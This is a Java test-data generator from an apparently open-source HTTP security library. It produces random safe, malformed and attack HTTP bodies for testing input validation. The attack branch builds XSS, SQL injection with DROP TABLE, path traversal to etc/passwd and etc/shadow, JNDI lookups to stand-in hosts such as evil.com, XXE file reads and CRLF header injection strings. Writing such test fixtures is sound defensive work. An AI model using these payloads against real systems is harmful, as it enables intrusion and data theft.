/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;
import de.cuioss.tools.security.http.data.HTTPBody;

/**
 * Generates HTTPBody records for testing purposes.
 * 
 * IMPROVED: Uses dynamic generation instead of hardcoded arrays for better randomness
 * and unpredictability while maintaining attack effectiveness.
 * 
 * Implements: Task G9 from HTTP verification specification
 */
public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {

    // Core generation parameters
    private final TypedGenerator<Integer> contentTypeGenerator = Generators.integers(0, 3);
    private final TypedGenerator<String> userNameCategories = Generators.fixedValues("john", "admin", "user", "test");
    private final TypedGenerator<String> roleCategories = Generators.fixedValues("admin", "user", "guest", "manager");
    private final TypedGenerator<String> scriptTypes = Generators.fixedValues("alert", "confirm", "prompt");
    private final TypedGenerator<String> xssCategories = Generators.fixedValues("XSS", "1", "cookie");
    private final TypedGenerator<String> sqlTypes = Generators.fixedValues("DROP", "DELETE", "INSERT");
    private final TypedGenerator<String> tableCategories = Generators.fixedValues("users", "admin", "accounts", "sessions");
    private final TypedGenerator<String> systemPathTypes = Generators.fixedValues("etc", "windows", "boot", "shadow");
    private final TypedGenerator<String> domainCategories = Generators.fixedValues("evil", "attacker", "malicious");
    private final TypedGenerator<String> dataCategories = Generators.fixedValues("user", "product", "order", "session");
    private final TypedGenerator<String> encodingCategories = Generators.fixedValues("gzip", "deflate", "br", "compress");
    private final TypedGenerator<Integer> depthGen = Generators.integers(1, 5);
    private final TypedGenerator<Integer> payloadSize = Generators.integers(100, 500);
    private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
    private final TypedGenerator<Integer> stringSize = Generators.integers(3, 12);
    private final TypedGenerator<Integer> numberRange = Generators.integers(100, 999);

    @Override
    public HTTPBody next() {
        int type = contentTypeGenerator.next();

        String content = switch (type) {
            case 0 -> generateSafeContent();
            case 1 -> generateAttackContent();
            case 2 -> generateMalformedContent();
            default -> generateSafeContent();
        };

        String contentType = generateContentType();
        String encoding = generateEncoding();

        return new HTTPBody(content, contentType, encoding);
    }

    private String generateSafeContent() {
        int contentType = Generators.integers(0, 6).next();
        return switch (contentType) {
            case 0 -> generateJsonContent();
            case 1 -> generateFormData();
            case 2 -> generateXmlContent();
            case 3 -> generatePlainText();
            case 4 -> generateFileContent();
            case 5 -> generateTokenContent();
            case 6 -> generateStatusContent();
            default -> generatePlainText();
        };
    }

    private String generateJsonContent() {
        String user = generateUserName();
        String role = generateRole();
        return "{\"user\":\"" + user + "\",\"role\":\"" + role + "\"}";
    }

    private String generateFormData() {
        String user = generateUserName();
        String pass = "secret" + numberRange.next();
        return "username=" + user + "&password=" + pass;
    }

    private String generateXmlContent() {
        String user = generateUserName();
        String role = generateRole();
        return "<user><name>" + user + "</name><role>" + role + "</role></user>";
    }

    private String generatePlainText() {
        String[] templates = {
                "Hello World",
                "file content here",
                "search query: java programming",
                "comment: This is a test comment",
                "description: Product information",
                "message: Welcome to our application"
        };
        return templates[Generators.integers(0, templates.length - 1).next()];
    }

    private String generateFileContent() {
        String dataType = generateDataType();
        int id = Generators.integers(1000, 9999).next();
        return "data: " + id + ", type: " + dataType;
    }

    private String generateTokenContent() {
        String prefix = generateTokenPrefix();
        String value = Generators.letterStrings(8, 16).next().toLowerCase();
        return prefix + ": " + value;
    }

    private String generateStatusContent() {
        String status = generateStatus();
        String version = Generators.integers(1, 5).next() + "." + Generators.integers(0, 9).next();
        return "status: " + status + ", version: " + version;
    }

    private String generateAttackContent() {
        int attackType = Generators.integers(0, 8).next();
        return switch (attackType) {
            case 0 -> generateXSSAttack();
            case 1 -> generateSQLInjection();
            case 2 -> generatePathTraversal();
            case 3 -> generateJNDIAttack();
            case 4 -> generateControlCharAttack();
            case 5 -> generateResponseSplitting();
            case 6 -> generateXXEAttack();
            case 7 -> generateUnicodeAttack();
            case 8 -> generateLargePayload();
            default -> generateXSSAttack();
        };
    }

    private String generateXSSAttack() {
        String scriptName = generateScriptName();
        String payload = generateXSSPayload();
        return "<script>" + scriptName + "('" + payload + "')</script>";
    }

    private String generateSQLInjection() {
        String command = generateSQLCommand();
        String table = generateTableName();
        return "'; " + command + " " + table + "; --";
    }

    private String generatePathTraversal() {
        int depth = depthGen.next();
        StringBuilder path = new StringBuilder();
        for (int i = 0; i < depth; i++) {
            path.append("../");
        }
        path.append(generateSystemFile());
        return path.toString();
    }

    private String generateJNDIAttack() {
        String host = generateMaliciousDomain();
        String exploit = generateExploitTerm();
        return "${jndi:ldap://" + host + "/" + exploit + "}";
    }

    private String generateControlCharAttack() {
        int numChars = Generators.integers(3, 6).next();
        StringBuilder chars = new StringBuilder();
        for (int i = 0; i < numChars; i++) {
            int charCode = Generators.integers(0, 31).next();
            chars.append("\\u").append("%04x".formatted(charCode));
        }
        return chars.toString();
    }

    private String generateResponseSplitting() {
        String status = generateHTTPStatus();
        return "%0d%0a%0d%0aHTTP/1.1 " + status + "%0d%0a";
    }

    private String generateXXEAttack() {
        String systemFile = generateSystemFile();
        String entityName = generateEntityName();
        return "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY " + entityName + " SYSTEM \"file:///" + systemFile + "\">]><foo>&" + entityName + ";</foo>";
    }

    private String generateUnicodeAttack() {
        String scriptName = generateScriptName();
        return "\\u202e\\u202d" + scriptName + ":alert(1)";
    }

    private String generateLargePayload() {
        int size = payloadSize.next();
        return Generators.letterStrings(size, size + 100).next();
    }

    private String generateMalformedContent() {
        int malformType = Generators.integers(0, 7).next();
        return switch (malformType) {
            case 0 -> ""; // Empty content
            case 1 -> "   "; // Whitespace only
            case 2 -> generateBinaryData();
            case 3 -> generateMalformedJson();
            case 4 -> generateMalformedXml();
            case 5 -> generateEmptyFormData();
            case 6 -> generateHeaderInjection();
            case 7 -> generateZeroWidthChars();
            default -> "";
        };
    }

    private String generateBinaryData() {
        int numBytes = Generators.integers(3, 8).next();
        StringBuilder binary = new StringBuilder();
        for (int i = 0; i < numBytes; i++) {
            int byteVal = Generators.integers(0, 255).next();
            binary.append("\\u").append("%04x".formatted(byteVal));
        }
        return binary.toString();
    }

    private String generateMalformedJson() {
        String key = generateDataType();
        String value = generateJSONValue();
        return "{\"" + key + "\": " + value + ",}"; // Extra comma
    }

    private String generateMalformedXml() {
        String tagName = generateDataType();
        return "<" + tagName + "><tag>"; // Unclosed tags
    }

    private String generateEmptyFormData() {
        String[] fields = {"username", "password", "email", "submit"};
        StringBuilder form = new StringBuilder();
        for (int i = 0; i < fields.length; i++) {
            if (i > 0) form.append("&");
            form.append(fields[i]).append("=");
        }
        return form.toString();
    }

    private String generateHeaderInjection() {
        String header = generateHeaderName();
        return header + ": text/html\\r\\n\\r\\n<html>";
    }

    private String generateZeroWidthChars() {
        String[] zeroWidth = {"\\u200B", "\\u200C", "\\u200D", "\\u2060"};
        StringBuilder chars = new StringBuilder();
        for (int i = 0; i < Generators.integers(2, 6).next(); i++) {
            chars.append(zeroWidth[Generators.integers(0, zeroWidth.length - 1).next()]);
        }
        return chars.toString();
    }

    private String generateContentType() {
        int contentTypeType = Generators.integers(0, 3).next();
        return switch (contentTypeType) {
            case 0 -> generateStandardContentType();
            case 1 -> generateAttackContentType();
            case 2 -> generateMalformedContentType();
            default -> generateStandardContentType();
        };
    }

    private String generateStandardContentType() {
        String[] standard = {
                "application/json", "application/x-www-form-urlencoded", "text/plain",
                "text/html", "text/xml", "application/xml", "multipart/form-data",
                "application/octet-stream", "image/png", "image/jpeg"
        };
        String base = standard[Generators.integers(0, standard.length - 1).next()];
        if (contextSelector.next()) {
            base += "; charset=utf-8";
        }
        return base;
    }

    private String generateAttackContentType() {
        String attack = generateAttackTerm();
        return "text/html; charset=<" + attack + ">alert(1)</" + attack + ">";
    }

    private String generateMalformedContentType() {
        int malformType = Generators.integers(0, 4).next();
        return switch (malformType) {
            case 0 -> "";
            case 1 -> "   ";
            case 2 -> "../../../etc/passwd";
            case 3 -> "application\\u0000/json";
            case 4 -> "invalid/content/type/with/slashes";
            default -> "";
        };
    }

    private String generateEncoding() {
        int encodingType = Generators.integers(0, 3).next();
        return switch (encodingType) {
            case 0 -> ""; // No encoding
            case 1 -> generateStandardEncoding();
            case 2 -> generateAttackEncoding();
            case 3 -> generateMalformedEncoding();
            default -> "";
        };
    }

    private String generateStandardEncoding() {
        String encoding = generateEncodingType();
        if (contextSelector.next()) {
            String second = generateEncodingType();
            return encoding + ", " + second;
        }
        return encoding;
    }

    private String generateAttackEncoding() {
        String attack = generateAttackTerm();
        return "gzip\\r\\nX-Injected: " + attack;
    }

    private String generateMalformedEncoding() {
        int malformType = Generators.integers(0, 3).next();
        return switch (malformType) {
            case 0 -> "   ";
            case 1 -> "../../../etc/passwd";
            case 2 -> "gzip\\u0000deflate";
            case 3 -> Generators.letterStrings(50, 200).next();
            default -> "   ";
        };
    }

    private String generateUserName() {
        int userType = Generators.integers(0, 3).next();
        return switch (userType) {
            case 0 -> userNameCategories.next();
            case 1 -> "user" + Generators.integers(1, 999).next();
            case 2 -> Generators.letterStrings(4, 8).next().toLowerCase();
            case 3 -> Generators.fixedValues("john", "admin", "guest", "demo").next();
            default -> userNameCategories.next();
        };
    }

    private String generateRole() {
        int roleType = Generators.integers(0, 2).next();
        return switch (roleType) {
            case 0 -> roleCategories.next();
            case 1 -> "role_" + Generators.letterStrings(3, 6).next().toLowerCase();
            case 2 -> Generators.fixedValues("super", "basic", "read", "write").next();
            default -> roleCategories.next();
        };
    }

    private String generateDataType() {
        int dataType = Generators.integers(0, 2).next();
        return switch (dataType) {
            case 0 -> dataCategories.next();
            case 1 -> "type_" + Generators.letterStrings(3, 7).next().toLowerCase();
            case 2 -> Generators.fixedValues("item", "record", "entity", "model").next();
            default -> dataCategories.next();
        };
    }

    private String generateTokenPrefix() {
        String[] prefixes = {"token", "id", "key", "auth", "bearer", "access"};
        return prefixes[Generators.integers(0, prefixes.length - 1).next()];
    }

    private String generateStatus() {
        String[] statuses = {"active", "inactive", "pending", "completed", "running", "failed"};
        return statuses[Generators.integers(0, statuses.length - 1).next()];
    }

    private String generateScriptName() {
        int scriptType = Generators.integers(0, 2).next();
        return switch (scriptType) {
            case 0 -> scriptTypes.next();
            case 1 -> Generators.fixedValues("eval", "setTimeout", "setInterval").next();
            case 2 -> "func" + Generators.integers(1, 99).next();
            default -> scriptTypes.next();
        };
    }

    private String generateXSSPayload() {
        int xssType = Generators.integers(0, 3).next();
        return switch (xssType) {
            case 0 -> xssCategories.next();
            case 1 -> "document." + Generators.fixedValues("cookie", "domain", "location").next();
            case 2 -> String.valueOf(Generators.integers(1, 9999).next());
            case 3 -> "'" + Generators.letterStrings(3, 8).next() + "'";
            default -> xssCategories.next();
        };
    }

    private String generateSQLCommand() {
        String type = sqlTypes.next();
        return switch (type) {
            case "DROP" -> "DROP TABLE";
            case "DELETE" -> "DELETE FROM";
            case "INSERT" -> "INSERT INTO";
            default -> type + " " + Generators.fixedValues("FROM", "INTO", "TABLE").next();
        };
    }

    private String generateTableName() {
        int tableType = Generators.integers(0, 2).next();
        return switch (tableType) {
            case 0 -> tableCategories.next();
            case 1 -> "tbl_" + Generators.letterStrings(4, 8).next().toLowerCase();
            case 2 -> Generators.fixedValues("data", "config", "logs", "temp").next();
            default -> tableCategories.next();
        };
    }

    private String generateSystemFile() {
        String pathType = systemPathTypes.next();
        return switch (pathType) {
            case "etc" -> "etc/" + Generators.fixedValues("passwd", "shadow", "hosts", "config").next();
            case "windows" -> "windows/" + Generators.fixedValues("win.ini", "system.ini", "boot.ini").next();
            case "boot" -> "boot.ini";
            case "shadow" -> "etc/shadow";
            default -> pathType + "/" + Generators.letterStrings(3, 8).next();
        };
    }

    private String generateMaliciousDomain() {
        String category = domainCategories.next();
        String tld = Generators.fixedValues("com", "net", "org", "xyz").next();
        return category + "." + tld;
    }

    private String generateExploitTerm() {
        String[] terms = {"exploit", "payload", "attack", "shell", "cmd", "exec"};
        return terms[Generators.integers(0, terms.length - 1).next()];
    }

    private String generateHTTPStatus() {
        String[] statuses = {"200 OK", "404 Not Found", "500 Error", "403 Forbidden", "401 Unauthorized"};
        return statuses[Generators.integers(0, statuses.length - 1).next()];
    }

    private String generateEntityName() {
        String[] entities = {"xxe", "exploit", "file", "entity", "dtd", "external"};
        return entities[Generators.integers(0, entities.length - 1).next()];
    }

    private String generateJSONValue() {
        String[] values = {"json", "data", "value", "content", "payload", "info"};
        return values[Generators.integers(0, values.length - 1).next()];
    }

    private String generateHeaderName() {
        String[] headers = {"Content-Type", "X-Forwarded-For", "User-Agent", "Authorization", "X-Custom", "Accept"};
        return headers[Generators.integers(0, headers.length - 1).next()];
    }

    private String generateAttackTerm() {
        String[] terms = {"script", "header", "passwd", "admin", "root", "cmd"};
        return terms[Generators.integers(0, terms.length - 1).next()];
    }

    private String generateEncodingType() {
        int encodingType = Generators.integers(0, 2).next();
        return switch (encodingType) {
            case 0 -> encodingCategories.next();
            case 1 -> Generators.fixedValues("identity", "chunked", "x-gzip").next();
            case 2 -> "custom-" + Generators.letterStrings(2, 5).next();
            default -> encodingCategories.next();
        };
    }

    @Override
    public Class<HTTPBody> getType() {
        return HTTPBody.class;
    }
}